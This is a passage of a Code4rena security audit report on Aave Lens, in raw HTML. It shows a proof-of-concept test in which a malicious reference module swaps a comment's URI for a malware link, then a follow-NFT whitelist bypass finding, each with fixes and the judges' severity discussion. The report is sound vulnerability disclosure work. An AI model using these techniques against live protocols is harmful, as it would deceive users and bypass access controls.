class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             pubIdPointed: 2,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             referenceModule: ZERO_ADDRESS,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             referenceModuleData: [],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-          })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        ).to.not.be.reverted;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          },{gasLimit:12450000})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // see the bait in the emitted event...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        matchEvent(receipt, &#39;CommentCreated&#39;, [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          FIRST_PROFILE_ID,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          3, // pubId 3 for profile 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          BAIT_COMMENT, // &lt;-- correct bait in the event</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          FIRST_PROFILE_ID,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          2,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          emptyCollectModule.address,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          [],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          ZERO_ADDRESS,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          [],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          await getTimestamp(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        ]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // ...but malware when read, commented, or referenced</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        let pub = await lensHub.getPub(FIRST_PROFILE_ID, 3);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await expect(pub.contentURI)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          .to.equal(BAIT_COMMENT);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   context(&#39;Meta-tx&#39;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     beforeEach(async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       await expect(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -567,5 +609,5 @@ makeSuiteCleanRoom(&#39;Publishing Comments&#39;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         expect(pub.referenceModule).to.eq(ZERO_ADDRESS);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  });/**/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> });</span></span></span></code></pre>\n<p>After applying the above changes, running <code>npm test test/hub/interactions/publishing-comments.spec.ts</code> yields:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  Publishing Comments</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    Generic</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      Scenarios</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        1) User should create a post using the mock reference module as reference module, then comment on that post</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  0 passing (19s)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  1 failing</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  1) Publishing Comments</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       Generic</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         Scenarios</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           User should create a post using the mock reference module as reference module, then comment on that post:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      AssertionError: expected &#39;https://yourCommentIsNowOnALinkToMalware.com/forever&#39; to equal &#39;https://somethingExtremelyInteresting.com/toGetEngagement&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      + expected - actual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      -https://yourCommentIsNowOnALinkToMalware.com/forever</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      +https://somethingExtremelyInteresting.com/toGetEngagement</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      at Context.&lt;anonymous&gt; (test/hub/interactions/publishing-comments.spec.ts:245:15)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      at processTicksAndRejections (internal/process/task_queues.js:97:5)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      at runNextTicks (internal/process/task_queues.js:66:3)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      at listOnTimeout (internal/timers.js:523:9)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      at processTimers (internal/timers.js:497:7)</span></span></span></code></pre>\n<p>Anyone that has commented on the engaging comment now has unwittingly commented on a malicious URI, potentially encouraging others to visit the URI.</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Code inspection\nHardhat</p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Store the new <code>pubCount</code> in a variable before the comment is created and use it during the creation rather than choosing it afterwards.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1072763598\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>This is valid and interesting! Especially because it can be attributed to incompetence instead of maliciousness on behalf of governance whitelisting a faulty module (which can also lead to loss of funds, etc). However, this does emit <em>multiple</em> events with the same publication ID, and thus I believe UIs can filter it, if ever it becomes an issue.</p>\n<p>On that front, the mitigation introduces another issue in that incrementing the pubId before creating the comment allows a comment to comment on itself. Paging @miguelmtzinf, wdyt? Also paging @donosonaumczuk.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1079380448\">Zer0dot (Aave Lens) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>We acknowledge this and will not be acting on it. I think it’s fair to say that if such a vulnerability is found, the double event emission can be a red flag, and governance can act promptly to unwhitelist the specific module. Note that there’s already nothing stopping malware or illegal content links from appearing on UIs, who already need to do filtering. Still, this is valid!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1116615338\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Upon first glance, this seems to be valid. An attacker could emit multiple events for a given comment, tricking light clients into responding to a potentially malicious post. However, it requires that reference modules are no longer whitelisted, allowing anyone to register a dodgy module or the governance accidentally registers a faulty module. I think for these reasons, I am more inclined to mark this as <code>medium</code> as it requires certain assumptions. While I understand C4 typically judges high severity issues as resulting in a loss of funds, Aave Lens is unique in that funds aren’t paramount to how the protocol is intended to be used. I am open to further discussion if you disagree with me in any way @Zer0dot?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1118624621\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>I wouldn’t put it beyond the realm of possibility to see governance accidentally whitelist a module where this is possible. I do agree it’s valid, medium sounds fine to me.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1119019232\">0xleastwood (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Sweet, I’ll downgrade this to <code>medium</code> considering we are both in agreement.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 14 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66\">report highlighted below</a> by <strong>WatchPug</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/60\">Dravee</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/82\">pauliax</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/73\">defsec</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/18\">csanuragjain</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/64\">hubble</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/80\">gzeon</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/15\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/87\">hyh</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/16\">sikorico</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/85\">0xwags</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/40\">0x0x0x</a>, <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/49\">0x1f8b</a>, and <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/54\">kenta</a>.</em></p>\n<h2 id=\"l-01-approvalfollowmodulesol-lack-of-transfer-check-make-it-possible-for-anyone-to-become-follower-without-approved-by-the-profile-owner\" style=\"position:relative;\"><a href=\"#l-01-approvalfollowmodulesol-lack-of-transfer-check-make-it-possible-for-anyone-to-become-follower-without-approved-by-the-profile-owner\" aria-label=\"l 01 approvalfollowmodulesol lack of transfer check make it possible for anyone to become follower without approved by the profile owner permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] <code>ApprovalFollowModule.sol</code> lack of transfer check make it possible for anyone to become follower without approved by the profile owner</h2>\n<p>Per the comment in <code>ApprovalFollowModule</code>, it aims to create a whitelist system:</p>\n<blockquote>\n<p>This follow module only allows addresses that are approved for a profile by the profile owner to follow.</p>\n</blockquote>\n<p>However, the current implementation only validates if <code>_approvedByProfileByOwner</code> when minting a new <code>followNFT</code>. But since the <code>follow</code> relationship is verified by the <code>followNFT</code> and the <code>followNFT</code> can be transferred to an arbitrary address.</p>\n<p>As a result, a non-whitelisted address can bypass the whitelist by buying the <code>followNFT</code> from a whitelisted address.</p>\n<p>The <code>followModuleTransferHook</code> can be used for blocking transfers to unapproved addresses.</p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/follow/FollowValidatorFollowModuleBase.sol#L23-L38\">FollowValidatorFollowModuleBase.sol#L23-L38</a><br></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">validateFollow</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">follower</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">followNFTTokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">followNFT</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILensHub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">HUB</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getFollowNFT</span><span class=\"mtk1\">(</span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">followNFT</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">FollowInvalid</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">followNFTTokenId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check that follower owns a followNFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">followNFT</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">follower</span><span class=\"mtk1\">) == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">FollowInvalid</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check that follower owns the specific followNFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">followNFT</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">followNFTTokenId</span><span class=\"mtk1\">) != </span><span class=\"mtk12\">follower</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">FollowInvalid</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>Alice created a private club and selected <code>ApprovalFollowModule</code> with 100 addresses of founding members and wanted to publish publications that can only be collected by those addresses;</li>\n<li>Bob as founding members of Alice’s private club, decides to sell his membership to Charlie by transfering the <code>followNFT</code> to Charlie, Charlie’s address has never be approved by Alice, but he is now a <code>follower</code> in Alice’s private club.</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">followModuleTransferHook</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">followNFTTokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">HUB</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">_approvedByProfileByOwner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">to</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">FollowNotApproved</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_approvedByProfileByOwner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">to</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">false</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// prevents repeat follows</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1042476748\">oneski (Aave Lens) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>This is by design. A more sophisticated module could implement non-transferable behavior or allow transfer only to approved addresses.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1118561892\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>IMO, this is a valid issue. If we want to strictly adhere to the whitelist, we should not allow whitelisted addresses to transfer NFTs to non-whitelisted addresses. This limits the formation of secondary markets where users can bypass whitelist restrictions.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1125577120\">Zer0dot (Aave Lens) disagreed with Medium severity and commented</a>:</strong></p>\n<blockquote>\n<p>Unfortunately transferrability is in the nature of the protocol. The module’s purpose is not to limit follows to only whitelisted wallets (as this is impossible to guarantee in case follow NFTs existed previously, though one could use the validation function etc). Rather, the goal of this module is simply to only allow whitelisted users to mint follow NFTs, what they do with them is up to them. </p>\n<p>Due to the confusing nature of the module, I would not dispute this but I would still disagree that it’s a medium severity issue, I would mark it as low.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1126113275\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>So if I’m understanding this correctly, whitelisted users who mint follow NFTs are free to do whatever with those, whether they sell them to other parties or give them away. It’s completely up to them?</p>\n<p>If that’s the case, I’ll agree and mark this as QA.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1126121278\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>Yeah although it’s valid enough, this is just how the module works.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66#issuecomment-1126126555\">0xleastwood (judge) decreased severity to Low and commented</a>:</strong></p>\n<blockquote>\n<p>Okay, QA it is, good ser.</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations 